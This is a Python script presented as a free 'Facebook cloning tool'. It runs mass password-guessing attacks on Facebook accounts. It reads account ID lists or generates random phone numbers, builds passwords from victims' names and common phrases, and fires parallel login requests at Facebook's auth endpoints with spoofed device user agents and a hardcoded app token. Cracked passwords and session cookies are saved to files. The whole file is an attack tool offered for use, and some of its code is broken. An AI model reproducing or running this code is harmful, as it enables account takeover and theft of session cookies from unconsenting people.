import os,requests,json,time,re,random,sys,uuid,string,subprocess
from string import ascii_lowercase, ascii_uppercase, digits
import shutil
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as sop

try:
    import requests
    import bs4
    import json
    import re
    import random
    import string
    import subprocess
    import uuid
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from datetime import datetime
except ModuleNotFoundError: 
    print('\n Installing missing modules ...')
    os.system('pip install requests bs4 futures==2 > /dev/null')
    os.system('python FB.py')
############################
print('\x1b[1;92mFACEBOOK CLONING TOOL ')
time.sleep(2)
############################
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Telenor'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Telenor"
                        sim_id+=fbcr
        else:
                fbcr = 'Telenor'
                sim_id+=fbcr
except:
        fbcr = "Telenor"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
#+++++++++++++++++++++++++++++++++#
######YEAR CHECKER######
def zari(ids):
    if len(ids)==15:
        if ids[:10] in ['1000000000']       :alif = '2009'
        elif ids[:9] in ['100000000']       :alif = '2009'
        elif ids[:8] in ['10000000']        :alif = '2009'
        elif ids[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:alif = '2009'
        elif ids[:7] in ['1000006','1000007','1000008','1000009']:alif = '2010'
        elif ids[:6] in ['100001']          :alif = '2010-2011'
        elif ids[:6] in ['100002','100003'] :alif = '2011-2012'
        elif ids[:6] in ['100004']          :alif = '2012-2013'
        elif ids[:6] in ['100005','100006'] :alif = '2013-2014'
        elif ids[:6] in ['100007','100008'] :alif = '2014-2015'
        elif ids[:6] in ['100009']          :alif = '2015'
        elif ids[:5] in ['10001']           :alif = '2015-2016'
        elif ids[:5] in ['10002']           :alif = '2016-2017'
        elif ids[:5] in ['10003']           :alif = '2018-2019'
        elif ids[:5] in ['10004']           :alif = '2019-2020'
        elif ids[:5] in ['10005']           :alif = '2020'
        elif ids[:5] in ['10006','10007','']:alif = '2021'
        elif ids[:5] in ['10008']           :alif = '2022'
        elif ids[:5] in ['10009']           :alif = '2023'
        else:alif=''
    elif len(ids) in [9,10]:
        alif = '2008-2009'
    elif len(ids)==8:
        alif = '2007-2008'
    elif len(ids)==7:
        alif = '2006-2007 '
    elif len(ids) in [13,14]:
        alif = '2023-2024'
    else:alif=''
    return alif
#++++++++++++++COLORS+++++++++++++#
pwx=[]
W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
S = '\033[96;1m'
N = '\x1b[0m'
PURPLE ='\x1b[38;5;46m'
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
BLACK="\033[1;30m"
EXTRA ='\x1b[38;5;208m'
#++++++++++++LOGO+++++++++++++#

logo=(f"""{RED}

       
                     ██████╗███╗   ███╗███████╗
                    ██╔════╝████╗ ████║██╔════╝
                    ╚█████╗ ██╔████╔██║█████╗
                     ╚═══██╗██║╚██╔╝██║██╔══╝
                    ██████╔╝██║ ╚═╝ ██║██║
                    ╚═════╝ ╚═╝     ╚═╝╚═╝
                                        
{WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
OWNER        : RYUJIN
FACEBOOK     : https://www.facebook.com/Yuji.IAmLimitless
TOOL         : FREE
VERSION      : {GREEN}(0.1)
{WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
OK IDS SAVE IN    :\033[1;32m /sdcard/YUJI-OK.txt\033[1;37m
CP IDS SAVE IN    :\033[1;32m /sdcard/YUJI-CP.txt\033[1;37m
COOKIE SAVE IN    :\033[1;32m /sdcard/YUJI-COOKIE-OLD.txt [1000] \033[1;37m
COOKIE SAVE IN    :\033[1;32m /sdcard/YUJI-COOKIE-NEW.txt [6155] \033[1;37m
{WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#++++++++++LINEX++++++++#
def linex():
    print('\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
#++++++++++LOOP+++++++++#
loop=0
oks=[]
cps=[]
twf=[]
pcp=[]
id=[]
tokenku=[]
user_agents=[]
#++++++++++MAIN+++++++++#
def YUJI():   
    os.system('clear')
    print(logo)
    try:
                y = ("***")
                if y == ("***"):
                        print('[1] FILE CLONING ')
                        print('[2] RANDOM CLONING (SIM CODE) ')
                        print('[0] EXIT ')
                        linex()
                        opt=input('CHOOSE : ')
                        if opt in ['1','01']:
                                os.system('clear')
                                print(logo)
                                print('PUT FILE EXAMPLE :  /sdcard/YUJI.txt')
                                linex()
                                file = input('PUT FILE PATH\033[1;37m: ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print('FILE NOT FOUND ')
                                        time.sleep(1)
                                        main_approval()
                                os.system('clear')
                                print(logo)
                                print('[1] METHOD (GRAPH) ')
                                linex()
                                mthd=input('CHOOSE : ')
                                linex()
                                os.system('clear')
                                print(logo)
                                plist = []
                                print('[+] CHOOSE PASSLIST METHOD ')
                                linex()
                                print('[1] AUTO PASSWORD (30 PASSLIST) ')
                                print('[2] AUTO PASSWORD (20 PASSLIST) ')
                                print('[3] AUTO PASSWORD (15 PASSLIST) ')
                                print('[4] AUTO PASSWORD (6 PASSLIST) ')
                                print('[5] MANUAL PASSWORD ')
                                linex()
                                pswrd=input('CHOOSE: ')
                                if pswrd in ['1','01']:
                                        plist = ['firstlast','lastfirst','first','last','firstfirst','lastlast','first123','first143','first1234','first12345','last123','last1234','last12345','first last','last first','firstlast123','firstlast12345','first15','first16','first17','first18','first19','first20','last143','firstganda','firstpogi','cuteko','first2021','first2022','first2023']
                                elif pswrd in ['2','02']:
                                	    plist = ['first','last','first123','first143','last123','last143','last12345','first12345','firstlast','first last','lastfirst','last first','firstlast123','first15','first16','first17','first18','first19','firstpogi','firstmaganda']
                                elif pswrd in ['3','03']:
                                	    plist = ['first123','first143','first','last123','last','last143','firstlast','first last','firstlast123','first15','first16','first17','first18','first19','first12345']
                                elif pswrd in ['4','04']:
                                	    plist = ['first123','first143','firstlast','first last','first12345','first18']
                                else:
                                        try:
                                                linex()
                                                ps_limit = int(input('HOW MANY PASSWORDS DO YOU WANT TO ADD? '))
                                        except:
                                                ps_limit =1
                                        linex()
                                        print('\033[1;32m EXAMPLE : first last, firtslast, first123')
                                        linex()
                                        for i in range(ps_limit):
                                                plist.append(input(f' PUT PASSWORD {i+1}: '))
                                linex()
                                os.system('clear')
                                print(logo)
                                print('SHOW CP RESULT? : (Y/N): ')
                                linex()
                                cx=input('CHOOSE : ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        os.system('clear')
                                        print(logo)
                                        total_ids = str(len(fo))
                                        
                                        print('TOTAL ACCOUNT : \033[1;32m('+total_ids+f')\033[1;37m')
                                        print('TAKE NOTE: ON AIRPLANE MODE IF NO RESULT\033[1;37m')
                                        print('METHOD : '+mthd+' ')
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(meth1,ids,names,passlist)
                                print('\033[1;37m')
                                linex()
                                print('THE PROCESS HAS COMPLETED')
                                print('Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                linex()
                                input('PRESS ENTER TO BACK ')
                                YUJI()
                        elif opt in ['2','02']:
                        	ph()
                        elif opt in ['0','00']:
                        	print(f'{R}GOOD BYE')
                        else:
                        	print(f'{R}INVALID')
                        	
    except requests.exceptions.ConnectionError:
                print('\n NO INTERNET CONNECTION ...')
                exit()
######
def ph():
    user=[]
    os.system('clear')
    print(logo)
    print(f'{G}EXAMPLE : +63923, +63927, +63928 ')
    linex()
    code = input(f'{G}SIM CODE: ')
    linex()
    try:
        limit = int(input(f'{G}PUT LIMIT: '))
    except ValueError:
        limit = 5000
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with tred(max_workers=30) as ZARI:     
        os.system('clear')
        print(logo)
        
        tl = str(len(user))
        print(f'{G}LIMIT: '+tl)
        print(f'{G}SIM CODE: '+code)
        linex()
        for psx in user:
            ids = code+psx
            passlist = [psx,ids,'magandaako','gandako','pogiako','pogiako123','gwapoako123','gwapoako','iloveyou','i love you','cuteko','cuteko123','cuteko143','mahal123','mahal143','iloveyou143','maganda123','maganda143','pogi123','pogi143']
            ZARI.submit(rndm,ids,passlist)
    print('\033[1;37m')
    linex()
    print('THE PROCESS HAS COMPLETED')
    print('TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
    linex()
    input('PRESS ENTER TO BACK ')
    main()
#++++++
def warlee():
    and_ver = str(random.randrange(9,12))
    app_ver = str(random.randint(111,999))+".0.0."+str(random.randrange(9,99))+"."+str(random.randint(111,333))
    app_ver1 = str(random.randint(111,999))+".0.0."+str(random.randrange(9,99))+"."+str(random.randint(111,333))
    app_ver_code = str(random.randint(111111111,999999999))
    app_ver_code1 = str(random.randint(111111111,999999999))
    model = random.choice(["CPH2411", "CPH2423", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2447", "CPH2449", "CPH2451", "CPH2399", "CPH2401", "CPH2381", "CPH2409", "CPH2459", "CPH2477", "CPH2471", "CPH1923", "CPH1837", "CPH1803", "CPH1853", "CPH1809", "CPH1931", "CPH1933", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2133", "CPH2139", "CPH2135", "CPH2303", "CPH2387", "CPH2407", "CPH2385", "CPH1901", "CPH1905", "CPH2067", "CPH2219", "CPH2339", "CPH2483", "CPH2495", "CPH1937", "CPH1941", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH1920", "CPH1903", "CPH1705fw", "CPH1605", "OPPO CPH1605", "CPH1605fw", "CPH1609", "CPH1609fw", "CPH1613", "CPH1613fw", "CPH1701", "CPH1701fw", "CPH1705", "CPH1707", "CPH1707fw", "CPH1715", "CPH1717", "CPH1719", "CPH1721", "CPH1723", "CPH1725", "CPH1727", "CPH1729", "CPH1801", "CPH1803", "CPH1805", "CPH1807", "CPH1808", "CPH1827", "CPH1851", "CPH1853", "CPH1893", "CPH1893", "CPH1903", "CPH1907", "CPH1909", "CPH1938", "CPH1989", "CPH2001", "CPH2015", "CPH2021", "CPH2031", "CPH2043", "CPH2071", "CPH2073", "CPH2077", "CPH2081", "CPH2083", "CPH2095", "CPH2109", "CPH2113", "CPH2145", "CPH2159", "CPH2161", "CPH2173", "CPH2179", "CPH2185", "CPH21859", "CPH2195", "CPH2197", "CPH2201", "CPH2207", "CPH2211", "CPH2213", "CPH2219", "CPH2223", "CPH2235", "CPH2237", "CPH2239", "CPH2241", "CPH2247", "CPH2249", "CPH2251", "CPH2263", "CPH2269", "CPH2271", "CPH2273", "CPH2275", "CPH2293", "CPH2309", "CPH2325", "CPH2365", "CPH2421", "CPH2455", "CPH2457", "CPH2461", "CPH2473", "CPH1911", "CPH1913", "CPH1915", "CPH1969", "CPH1987", "CPH2119", "CPH2285", "CPH1819", "CPH1821", "CPH1823", "CPH1825", "CPH1881", "CPH2437", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2009", "CPH2025", "CPH2173", "CPH2307", "CPH2305", "CPH1955", "CPH2137", "CPH2321", "CPH2385", "CPH2197", "CPH2341", "CPH2199", "CPH2201", "CPH2237", "CPH2363", "CPH2371", "CPH2371", "CPH2353", "CPH2343", "CPH2343", "CPH2363", "CPH2359", "CPH2357", "CPH1835", "CPH1831", "CPH1833", "CPH1833", "CPH1879", "CPH1877", "CPH1607", "CPH1607fw", "CPH1611", "CPH1917", "CPH1917", "CPH1921", "CPH1919", "CPH1919RU", "CPH1919", "CPH1921", "CPH1907", "CPH2065", "CPH1983", "CPH1979", "CPH1979", "CPH1945", "CPH1951", "CPH2043", "CPH2013", "CPH2009", "CPH2035", "CPH2036", "CPH2037", "CPH2091", "CPH2209", "CPH2125", "CPH2089", "CPH2089", "CPH2159", "CPH2217", "CPH2205", "CPH2343", "CPH2505", "CPH1859", "CPH1861"])
    model1 = random.choice(["Infinix_X689F", "Infinix_X682B", "Infinix_X682C", "Infinix_X657B", "Infinix_X688B", "Infinix_X688C", "Infinix_X657B", "Infinix_X658B", "Infinix_X658E", "Infinix_X659", "Infinix_X659B", "Infinix_X662", "Infinix_X662B", "Infinix_X689F", "Infinix_X675", "Infinix_X6812", "Infinix_X665", "Infinix_X665B", "Infinix_X510", "Infinix_X6827", "Infinix_X665C", "Infinix_X665E", "Infinix_HOT 3 Pro", "Infinix-X554", "Infinix_HOT 3 LTE", "Infinix_HOT 3 LTE", "Infinix_HOT 4", "Infinix_HOT4 LTE", "Infinix_HOT 4", "Infinix_X557", "Infinix_HOT 4", "Infinix_HOT 4", "Infinix_HOT 4 Lite", "Infinix_HOT 4 Pro", "Infinix_X556_LTE", "Infinix_HOT 4 Pro", "Infinix_HOT 4 Pro", "Infinix_X606", "Infinix_X606B", "Infinix_X606C", "Infinix_X606D", "Infinix_X608", "Infinix_X624", "Infinix_X624B", "Infinix_X625B", "Infinix_X625D", "Infinix_X650B", "Infinix_X650C", "Infinix_X650D", "Infinix_X650", "Infinix-X551", "Infinix_X688B", "Infinix_X688C", "Infinix_X573", "Infinix_X573S", "Infinix_X573B", "Infinix_X622", "Infinix_X559C", "Infinix_X559F", "Infinix_X559", "Infinix_HOT 4", "Infinix_HOT 4 Pro", "Infinix_X657B", "Infinix_X689", "Infinix_X689B", "Infinix_X689D", "Infinix_X689C", "Infinix_PR652B", "Infinix_PR652C", "Infinix_X6812B", "Infinix_X6817", "Infinix_X668", "Infinix_X668C", "Infinix_X6816C", "Infinix_X6816D", "Infinix_X6826", "Infinix_X6826B", "Infinix_X6826C", "Infinix_X6835", "Infinix_X6835B", "Infinix_X669", "Infinix_X669C", "Infinix_X669D", "Infinix_X623", "Infinix_X623B", "Infinix_X625C", "Infinix_X625C", "Infinix_X655", "Infinix_X655C", "Infinix_X655D", "Infinix_X680", "Infinix_X680B", "Infinix_X680C", "Infinix_X680E", "Infinix_X680F", "Infinix_X655F", "Infinix_X693", "Infinix_X663B", "Infinix_X693", "Infinix_X663C", "Infinix_X676C", "Infinix_X671", "Infinix_X676B", "Infinix_X671B", "Infinix_X6819", "Infinix_X6833B", "Infinix_X604", "Infinix_X604B", "Infinix_X605", "Infinix_X656", "Infinix_X604", "Infinix_X604B", "Infinix_X680", "Infinix_X680D", "Infinix_X6515", "Infinix_X6516", "Infinix_X5010", "Infinix_X510", "Infinix_X559", "Infinix_X571", "Infinix_X572", "Infinix_X6821", "Infinix_X6815B", "Infinix_X687B", "Infinix_X6811B", "Infinix_X6810", "Infinix_X6811", "Infinix_X687", "Infinix_X663", "Infinix_X695", "Infinix_X695C", "Infinix_X695D", "Infinix_X697", "Infinix_X698", "Infinix_X670", "Infinix_X676B", "Infinix_X672", "Infinix_X677", "Infinix_NOTE 3", "Infinix_NOTE 3 Pro", "Infinix_NOTE 3 Pro", "Infinix_X601_LTE", "Infinix_X572", "Infinix_X572-LTE", "Infinix_X571", "Infinix_X571-LTE", "Infinix_X690", "Infinix_X690B", "Infinix_X690C", "Infinix_X692", "Infinix_X683", "Infinix_X683B", "Infinix_X610B", "Infinix_X454", "Infinix_X455", "Infinix_S2", "Infinix_S2 Pro", "Infinix_X626", "Infinix_X626B", "Infinix_X626B LTE", "Infinix_X652", "Infinix_X652A", "Infinix_X652B", "Infinix_X652C", "Infinix_X660", "Infinix_X660B", "Infinix_X660C", "Infinix_X657", "Infinix_X657B", "Infinix_X657C", "Infinix_X6511", "Infinix_X657B", "Infinix_X6511", "Infinix_X6511B", "Infinix_X6511E", "Infinix_X6512", "Infinix_X6511G", "Infinix_X6823", "Infinix_X6823C", "Infinix_X6517", "Infinix_X612", "Infinix_X612B", "Infinix_X511", "Infinix_X5515", "Infinix_X5515F", "Infinix_X5515I", "Infinix_X609", "Infinix_X609B", "Infinix_X5514D", "Infinix_X5516", "Infinix_X5516B", "Infinix_X5516C", "Infinix_X627", "Infinix_X627V", "Infinix_X627W", "Infinix_X653", "Infinix_X653C", "Infinix_X405", "Infinix_X505", "Infinix_HOT S", "Infinix-X521", "Infinix-X521-LTE", "Infinix_X521", "Infinix-X521", "Infinix-X521", "Infinix_X521", "Infinix_X521_LTE", "Infinix-X521", "Infinix_X521", "Infinix_X521", "Infinix_HOT S", "Infinix-X521", "Infinix_X521", "Infinix-X521", "Infinix-X521_LTE", "Infinix_X521", "Infinix-X521S", "Infinix_X521S", "Infinix_Zero 3", "Infinix-X552", "Infinix-X552", "Infinix_Zero 3", "Infinix-X552", "Infinix_Zero 3", "Infinix-X552", "Infinix_Zero 4", "Infinix_HOT 4", "Infinix_X572", "Infinix_X572-LTE", "Infinix-X600", "Infinix-X600-LTE", "Infinix_X6815", "Infinix_X6815C", "Infinix_X6815D", "Infinix_X6820", "Infinix_X6811", "Infinix_X509", "Infinix_Zero 4", "Infinix_Zero 4 Plus", "Infinix_X603", "Infinix_X603", "Infinix_X603-LTE", "Infinix_X620B", "Infinix_X620", "Infinix_X6515"])
    sim = random.choice(["Verizon","T-Mobile","Visible","US Mobile","Mint Mobile","Boost Mobile","Xfinity"])
    sim1 = random.choice(["Verizon","T-Mobile","Visible","US Mobile","Mint Mobile","Boost Mobile","Xfinity"])
    density = random.choice(["1.5","2.0","3.0"])
    width = random.choice(["540","720","1080"])
    height = str(random.randrange(999,2480))
    density1 = random.choice(["1.5","2.0","3.0"])
    width1 = random.choice(["540","720","1080"])
    height1 = str(random.randrange(999,2480))
    user_agent = f"[FBAN/FB4A;FBAV/"+str(app_ver)+";FBBV/"+str(app_ver_code)+";FBDM/"+"{density="+str(density)+",width="+str(width)+",height="+str(height)+"};FBLC/en_US;FBCR/"+str(sim)+";FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/"+str(model)+";FBSV/"+str(and_ver)+";FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FB4A/;FBAV/YZWSES93;FBBV/342657617;FBAN/FB4A;FBAV/YZWSES93;FBBV/342657617;FBDM//*{density=3.0,width=1080,height=2560};FBLC/ja_JP;FBRV/554638314;FBCR/TECNO;FBMF/Xiaomi;FBBD/Megagate;FBPN/com.facebook.katana;FBDV/Motorola_Moto_G200;FBSV/16;FBOP/6;FBCA/armeabi;]"
    user_agents.append(f'"{user_agent}"')
    return user_agent
#++++++
def meth1(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m(YUJI-CRACKING) %s | \033[1;32mOK: %s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        ua = warlee()
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
                        headers = {'Authorization': f'OAuth {accessToken}', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Type': 'unknown', 'User-Agent': ua, 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
                        url = 'https://api.facebook.com/method/auth.login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        YUJI = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in YUJI:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in YUJI["session_cookies"])
                                        print('\r\r\033[1;32m[YUJI-OK] '+ids+' | ' + pas + ' | ' + zari(ids) + '\033[1;97m')
                                        open('/sdcard/YUJI-OK.txt','a').write(ids+'|'+pas+'\n')
                                        if ids[:4] in ['1000']:
                                            open('/sdcard/YUJI-OLD-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        elif ids[:4] in ['6155']:
                                            open('/sdcard/YUJI-NEW-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(YUJI):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;34m[YUJI-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in YUJI['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m[YUJI-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/YUJI-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/YUJI-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                continue
                loop+=1
        except Exception as e:
                pass
##########
def rndm(ids,passlist):
    global loop
    global oks
    sys.stdout.write('\r\r\033[1;37m(YUJI-CRACKING) %s | \033[1;32mOK: %s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
    try:
        for pas in passlist:
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(111111111,999999999))
            android_version = device['android_version']
            model = device['model']
            build = device['build']
            fblc = device['fblc']
            fbcr = sim_id
            fbmf = device['fbmf']
            fbbd = device['fbbd']
            fbdv = device['fbdv']
            fbsv = device['fbsv']
            fbca = device['fbca']
            fbdm = device['fbdm']
            fbfw = '1'
            fbrv = '0'
            fban = 'FB4A'
            fbpn = 'com.facebook.katana'
            data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_US','client_country_code': 'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
            headers=  {'User-Agent': warlee(), 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'https://b-graph.facebook.com/auth/login'
            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
            po = requests.post(url,data=data,headers=headers).json()
            if 'session_key' in po:
                try:
                    uid = po['uid']
                except:
                    uid = ids
                if str(uid) in oks:
                    break
                else:
                    print('\r\r\033[1;32m[YUJI-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                    coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    open('/sdcard/YUJI-COOKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                    open('/sdcard/YUJI-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in po['error']['message']:
                try:
                    uid = po['error']['error_data']['uid']
                except:
                    uid = ids
                if uid in oks:
                    pass
                else:
                    print('\r\r\x1b[1;31m[YUJI-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                    open('/sdcard/YUJI-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                    cps.append(str(ids))
                    break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)        
    except Exception as e:
        pass
YUJI()
